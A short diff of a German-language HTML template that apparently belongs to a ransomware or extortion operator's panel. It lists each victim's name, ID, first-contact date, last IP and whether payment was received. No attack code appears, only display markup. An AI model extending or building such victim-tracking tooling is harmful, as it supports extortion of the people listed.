@@ -7,9 +7,10 @@
     {% for victim in victims %}
     <div class="card col-sm-4">
         <div class="card-body mx-auto text-center">
-            <h5 class="card-title"><b>Opfer {{victim.victim_id}}</b></h5>
+            <h5 class="card-title"><b>Opfer {{victim.victim_name}}</b></h5>
             <hr>
             <p class="card-text">
+            <h6><b>ID:</b> {{victim.victim_id}}</h6>
             <h6><b>Erstkontakt:</b> {{victim.date_firstContact}}</h6>
             <h6><b>Letzte IP:</b> {{victim.ip_firstContact}}</h6>
             <h6><b>Zahlung erfolgt:</b> {{victim.payment_received}}</h6>
